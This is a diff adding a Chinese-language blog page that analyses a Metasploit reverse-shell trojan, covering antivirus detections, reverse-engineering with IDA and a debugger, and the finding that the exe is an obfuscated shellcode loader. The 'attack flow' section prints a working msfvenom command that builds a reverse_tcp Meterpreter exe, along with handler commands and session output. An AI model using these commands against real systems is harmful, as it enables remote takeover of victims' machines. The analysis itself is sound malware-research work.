@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+
+    
+<script>!function(){document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>msf反弹shell木马分析 1.0</title>
+<meta name="keywords" content="msf反弹shell木马分析 1.0, The simpler, the happier">
+<meta name="description" content="杀软检测360报毒 
+1234类型HEUR/QVM20.1.0AD7.Malware.Gen描述:HEUR/QVM20.1.0AD7.Malware.Gen
+
+
+
+
+火绒报毒:
+病毒类型: 代码混淆器(VirTool&#x2F;Meterp">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="msf反弹shell木马分析 1.0">
+<meta property="og:description" content="杀软检测360报毒 
+1234类型HEUR/QVM20.1.0AD7.Malware.Gen描述:HEUR/QVM20.1.0AD7.Malware.Gen
+
+
+
+
+火绒报毒:
+病毒类型: 代码混淆器(VirTool&#x2F;Meterp">
+
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 7.0.0"></head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://redqx.github.io">
+        <img class="avatar" src="/images/avatar.png" alt="logo" width="32px" height="32px">
+      </a>
+      <a href="https://redqx.github.io">
+        <h1 class="site-title">The simpler, the happier</h1>
+      </a>
+    </div>
+    <div class="right">
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/tags/" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/categories/" class="menu purple-link">
+        分类
+      </a>
+    
+  
+    
+      <a href="/archives/" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/about/" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">msf反弹shell木马分析 1.0</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2023-12-17</span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <h1 id="杀软检测"><a href="#杀软检测" class="headerlink" title="杀软检测"></a>杀软检测</h1><p>360报毒 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">类型</span><br><span class="line">HEUR/QVM20.1.0AD7.Malware.Gen</span><br><span class="line">描述:</span><br><span class="line">HEUR/QVM20.1.0AD7.Malware.Gen</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a class="simple-lightbox" href="/./img/image-20231217171820296.png"><img   src="/images/loading.svg" data-src="/./img/image-20231217171820296.png"  alt="image-20231217171820296" lazyload></a></p>
+<p>火绒报毒:</p>
+<p>病毒类型: 代码混淆器(VirTool&#x2F;Meterpreter.a)</p>
+<p><a class="simple-lightbox" href="/./img/image-20231217171709251.png"><img   src="/images/loading.svg" data-src="/./img/image-20231217171709251.png"  alt="image-20231217171709251" lazyload></a></p>
+<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><p>生成木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.24 LPORT=4444 -f exe -o app.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>进入<code> msfconsole</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ msfconsole</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 192.168.127.129</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 8888</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.127.129:8888 </span><br><span class="line">[*] Sending stage (175686 bytes) to 192.168.127.128</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.127.129:8888 -&gt; 192.168.127.128:50044) at 2023-12-17 04:31:45 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\Users\D0g3\Desktop</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : DESKTOP-FNOV5IM</span><br><span class="line">OS              : Windows 10 (10.0 Build 19044).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>首先用IDA静态分析</p>
+<p>一来就出现了很多垃圾字节码</p>
+<p><a class="simple-lightbox" href="/./img/image-20231217220800568.png"><img   src="/images/loading.svg" data-src="/./img/image-20231217220800568.png"  alt="image-20231217220800568" lazyload></a></p>
+<p>那长长的一条全是垃圾代码</p>
+<p>特点:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">长度随机: 如果再次生成木马,会发现该垃圾代码长度发生了改变</span><br><span class="line">内容随机: 如果再次生成木马,垃圾代码的内容发生了变化</span><br><span class="line">不对栈的内容修改,虽然会修改一些通用寄存器二点值,但这些通用寄存器一般是没啥用的</span><br></pre></td></tr></table></figure>
+
+
+
+<p>跳过垃圾代码还是很难分析,,因为在正常代码中,仍然插入了很多垃圾代码</p>
+<p>类似于这种</p>
+<p><a class="simple-lightbox" href="/./img/image-20231217221054325.png"><img   src="/images/loading.svg" data-src="/./img/image-20231217221054325.png"  alt="image-20231217221054325" lazyload></a></p>
+<p>于是尝试动态分析: 火绒剑+api monitor</p>
+<p>火绒剑: 看不到关键api调用的函数栈,所以找不到哪里调用了什么</p>
+<p>api monitor:  看不到当前模块的调用动作,,全是其它模块</p>
+<p>比如在利用火绒剑分析的时候,,分析tcp连接的时候,,,函数的返回根本就没有用户模块,,</p>
+<p>而且很多关键的操作甚至没有函数栈</p>
+<p>比如在利用api monitor分析时候,比如木马是app.exe</p>
+<p>api monitor的监控过程既然没有app.exe模块,,,</p>
+<p>简直是有点震惊哟….</p>
+<p>在某一个时刻,,我就疑惑</p>
+<p>msf每次生成的木马,会不会是一样的,,,</p>
+<p>于是尝试去生成,,,发现并不一样</p>
+<p>在某一刻我对木马的导入表产生兴趣</p>
+<p><a class="simple-lightbox" href="/./img/image-20231217221800360.png"><img   src="/images/loading.svg" data-src="/./img/image-20231217221800360.png"  alt="image-20231217221800360" lazyload></a></p>
+<p>发现他豪不避讳的引入了很多dll和很多API</p>
+<p>在某一刻,,我去动态调试木马,,,</p>
+<p>比如在LoadLibrary和GetProAddress下断点</p>
+<p>发现LoadLibrary只断下一次,,然后参数是某个网络通信的dll文件,,,既感到疑惑,,,也没有感到疑惑</p>
+<p>然后GetProAddress并没有断下来</p>
+<p>之前我在api monitor分析的时候,,因为找不到本模块的API调用,,并且在一些APi的返回地址发现不在本模块</p>
+<p>怀疑是远程线程注入什么的,,,后来发现并不是的</p>
+<p>因为木马本身加载了很多API,,比如网络通信的API,,所以不太可能是远处线程注入</p>
+<p>并且导入表也没有发下敏感的 有关注入的API,,,,</p>
+<p>在某次<code>kernel32_LoadLibraryA</code>下断的时候 </p>
+<p>发现参数是 <code>ws2_32</code></p>
+<p>然后返回地址是 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Stack[00007764]:0019FF54 AA 00 1D 00                   dd offset off_1D00AA</span><br><span class="line">Stack[00007764]:0019FF58 5C FF 19 00                   dd offset aWs232              ; &quot;ws2_32&quot;</span><br><span class="line">Stack[00007764]:0019FF5C 77 73 32 5F 33 32 00          aWs232 db &#x27;ws2_32&#x27;,0  </span><br></pre></td></tr></table></figure>
+
+<p>其中返回地址指向了 <code>1D00AA</code></p>
+<p>于是跟进,然后不断的C字节码</p>
+<p><a class="simple-lightbox" href="/./img/image-20231217222547175.png"><img   src="/images/loading.svg" data-src="/./img/image-20231217222547175.png"  alt="image-20231217222547175" lazyload></a></p>
+<p>发现返回到一块<code>debug045</code>节区</p>
+<p>这种节区一般是动态内存分配的,,,</p>
+<p>所以….为什么会出现动态内存分配</p>
+<p>估计是把一块shellcode分配到内存中,,然后分配权限,,然他执行</p>
+<p>这和shellcode加载岂不是一会事情,,,,</p>
+<p>我不由得想起了之前msf生成shellcode</p>
+<p>msf生成exe和生成shellcode区别在哪</p>
+<p>然后发现木马的exe中存在和msf生成的shellcode一模一样</p>
+<p>所以木马只是一个shellcode加载器,,,</p>
+<p>msf生成的shellcode如下</p>
+<p><a class="simple-lightbox" href="/./img/image-20231217223326163.png"><img   src="/images/loading.svg" data-src="/./img/image-20231217223326163.png"  alt="image-20231217223326163" lazyload></a></p>
+<p>通过定位,,,在木马中找打了shellcode,和msf的c语言shellcode简直一模一样</p>
+<p><a class="simple-lightbox" href="/./img/image-20231217223507418.png"><img   src="/images/loading.svg" data-src="/./img/image-20231217223507418.png"  alt="image-20231217223507418" lazyload></a></p>
+<p>在shellcode开始那里下断点,,,,</p>
+<p>然后在loadlibrary和getproaddress下断</p>
+<p>发现引入了ws2_32.dll 然后返回地址不是shellcode部分</p>
+<p>而是内存,,,</p>
+<p>木马木马中已经具备了直接运行shellcode的条件</p>
+<p>shellcode并没有让自己运行在木马已经有的空间中</p>
+<p>而是分配了内容,,,然后让他执行,,,,</p>
+<p>期间我也在getproaddress下断,,但并没有触发,,,说明了shellcode自己实现了getproaddress</p>
+<p>而不让我们去监视,,,,为什么可以监视到loadlibrary,,因为这个东西没办法自己实现</p>
+<p>shellcode顶多实现getmodulehandle</p>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#%E6%9D%80%E8%BD%AF%E6%A3%80%E6%B5%8B"><span class="top-box-text">杀软检测</span></a></li><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="top-box-text">攻击流程</span></a></li><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="top-box-text">分析过程</span></a></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2023/7eeb7e5d44be/">
+          <h3 class="post-title">
+            下一篇：免杀中的进程注入
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/f-dong" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"photo_zoom":"simple-lightbox"}}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
+</html>
+
